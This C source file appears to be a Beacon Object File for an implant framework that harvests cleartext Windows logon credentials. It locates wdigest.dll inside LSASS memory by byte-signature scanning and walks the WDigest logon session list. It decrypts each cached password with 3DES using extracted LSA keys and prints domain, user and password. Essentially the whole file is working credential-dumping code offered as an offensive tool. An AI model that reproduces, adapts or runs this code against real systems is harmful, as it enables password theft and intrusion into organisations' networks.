#include "../include/common_bof.h"

static const uint8_t WDIGEST_SIG_0[] = { 0x48, 0x3b, 0xd9, 0x74 };
static const uint8_t WDIGEST_SIG_1[] = { 0x48, 0x3b, 0xc8, 0x74 };

typedef struct { const uint8_t* pat; uint32_t len; } WdSig;
static const WdSig WDIGEST_SIGS[] = {
    { WDIGEST_SIG_0, sizeof(WDIGEST_SIG_0) },
    { WDIGEST_SIG_1, sizeof(WDIGEST_SIG_1) },
};

static ModuleInfo find_wdigest_module(HANDLE h, uint64_t dtb,
                                       uint64_t ep, uint32_t peb_off) {
    static const wchar_t wdigest_name[] = L"wdigest.dll";
    return find_module_in_lsass(h, dtb, ep, peb_off, wdigest_name, 11);
}

WDigestList extract_wdigest_creds(HANDLE h, uint64_t dtb,
                                   uint64_t lsass_ep, uint32_t peb_off,
                                   const LsaKeys* keys) {
    WDigestList results = {0};
    wdlist_init(&results);
    if (!results.items) return results;

    ModuleInfo wmod = find_wdigest_module(h, dtb, lsass_ep, peb_off);
    if (!wmod.base) {
        BeaconPrintf(CALLBACK_ERROR, "[-] wdigest.dll not found\n");
        return results;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  wdigest.dll base=%p\n", (void*)wmod.base);

    ByteBuf dll = read_dll_from_disk(L"wdigest.dll");
    if (!bb_valid(&dll) || dll.len < 0x1000) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot read wdigest.dll\n");
        bb_free(&dll); return results;
    }

    TextSection text = find_text_section(&dll);
    if (!text.raw_size || text.raw_offset + text.raw_size > dll.len) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot find .text in wdigest.dll\n");
        bb_free(&dll); return results;
    }

    const uint8_t* text_raw = dll.data + text.raw_offset;
    uint32_t sig_off = 0;
    for (size_t s = 0; s < sizeof(WDIGEST_SIGS)/sizeof(WDIGEST_SIGS[0]) && !sig_off; s++) {
        for (uint32_t i = 4; i + WDIGEST_SIGS[s].len <= text.raw_size; i++) {
            if (memcmp(text_raw + i, WDIGEST_SIGS[s].pat, WDIGEST_SIGS[s].len) == 0) {
                sig_off = i; break;
            }
        }
    }

    if (!sig_off) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WDigest signature not found\n");
        bb_free(&dll); return results;
    }

    int32_t disp;
    memcpy(&disp, text_raw + sig_off - 4, 4);
    uint32_t sig_rva    = text.virtual_address + sig_off;
    uint32_t target_rva = (uint32_t)((int32_t)sig_rva + disp);
    uint64_t list_head  = wmod.base + target_rva;

    BeaconPrintf(CALLBACK_OUTPUT, "  l_LogSessList=%p\n", (void*)list_head);
    bb_free(&dll);

    ByteBuf test = proc_read(h, dtb, list_head, 8);
    if (!bb_valid(&test)) {
        BeaconPrintf(CALLBACK_OUTPUT, "  WDigest: list not mapped\n");
        return results;
    }

    BOOL all_zero = TRUE;
    for (size_t z = 0; z < test.len; z++)
        if (test.data[z]) { all_zero = FALSE; break; }

    if (all_zero) {
        BeaconPrintf(CALLBACK_OUTPUT, "  WDigest: caching disabled\n");
        bb_free(&test); return results;
    }

    uint64_t flink = rp(test.data, 0);
    bb_free(&test);

    SeenSet seen;
    seen_init(&seen);

    while (flink && flink != list_head && !seen_contains(&seen, flink)
           && seen.count < 200) {
        seen_insert(&seen, flink);

        ByteBuf entry = proc_read(h, dtb, flink, 0x70);
        if (!bb_valid(&entry)) break;

        wchar_t user[MAX_NAME_LEN]   = {0};
        wchar_t domain[MAX_NAME_LEN] = {0};
        read_ustr(h, dtb, entry.data, 0x30, user,   MAX_NAME_LEN);
        read_ustr(h, dtb, entry.data, 0x40, domain, MAX_NAME_LEN);

        if (user[0] && domain[0]) {
            uint16_t pw_max_len = rw(entry.data, 0x52);
            uint16_t pw_len     = rw(entry.data, 0x50);
            uint64_t pw_ptr     = rp(entry.data, 0x58);

            if (pw_max_len > 0 && pw_len > 0 && pw_ptr) {
                ByteBuf enc_pw = proc_read(h, dtb, pw_ptr, pw_max_len);
                if (bb_valid(&enc_pw)) {
                    size_t padded = (enc_pw.len + 7) & ~(size_t)7;
                    if (padded > enc_pw.len) {
                        ByteBuf padded_buf = bb_alloc(padded);
                        if (bb_valid(&padded_buf)) {
                            memcpy(padded_buf.data, enc_pw.data, enc_pw.len);
                            bb_free(&enc_pw);
                            enc_pw = padded_buf;
                        }
                    }

                    uint8_t iv8[8] = {0};
                    memcpy(iv8, keys->iv, 8);
                    ByteBuf dec = des3_cbc_decrypt(enc_pw.data, enc_pw.len,
                                                    keys->des_key, iv8);
                    bb_free(&enc_pw);

                    if (bb_valid(&dec) && results.count < results.capacity) {
                        WDigestCredential* c = &results.items[results.count];
                        memset(c, 0, sizeof(WDigestCredential));

                        size_t un = 0, dn = 0;
                        while (user[un]   && un < MAX_NAME_LEN-1) un++;
                        while (domain[dn] && dn < MAX_NAME_LEN-1) dn++;
                        memcpy(c->user,   user,   (un+1)*sizeof(wchar_t));
                        memcpy(c->domain, domain, (dn+1)*sizeof(wchar_t));

                        BOOL is_machine = (un > 0 && user[un-1] == L'$');
                        if (is_machine) {
                            size_t hlen = dec.len < pw_len ? dec.len : pw_len;
                            if (hlen > MAX_NAME_LEN-1) hlen = MAX_NAME_LEN-1;
                            for (size_t xi = 0; xi < hlen; xi++) {
                                const wchar_t hx[] = L"0123456789abcdef";
                                c->password[xi*2]   = hx[(dec.data[xi]>>4)&0xF];
                                c->password[xi*2+1] = hx[dec.data[xi]&0xF];
                            }
                        } else {
                            size_t pw_chars = dec.len / 2;
                            if (pw_chars >= MAX_NAME_LEN) pw_chars = MAX_NAME_LEN-1;
                            memcpy(c->password, dec.data, pw_chars*2);
                            c->password[pw_chars] = 0;
                        }

                        if (c->password[0]) {
                            BOOL dup = FALSE;
                            for (size_t d = 0; d < results.count; d++) {
                                WDigestCredential* e = &results.items[d];
                                if (memcmp(e->user, c->user, (un+1)*2) == 0 &&
                                    memcmp(e->password, c->password,
                                           MAX_NAME_LEN*2) == 0) {
                                    dup = TRUE; break;
                                }
                            }
                            if (!dup) results.count++;
                        }
                        bb_free(&dec);
                    }
                }
            }
        }

        flink = rp(entry.data, 0);
        bb_free(&entry);
    }

    return results;
}

void print_wdigest(const WDigestList* creds) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n======================================================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, " WDIGEST CREDENTIALS (Cleartext)\n");
    BeaconPrintf(CALLBACK_OUTPUT,
        "======================================================================\n");

    if (!creds->count || !creds->items) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No WDigest credentials\n"
            "    (UseLogonCredential=0 or no logon since enable)\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d credential(s):\n\n",
                 (int)creds->count);

    for (size_t i = 0; i < creds->count; i++) {
        const WDigestCredential* c = &creds->items[i];
        print_wstr(L"  ", c->domain);
        BeaconPrintf(CALLBACK_OUTPUT, "\\");
        print_wstr(L"", c->user);
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
        print_wstr(L"    Password: ", c->password);
        BeaconPrintf(CALLBACK_OUTPUT, "\n\n");
    }
}
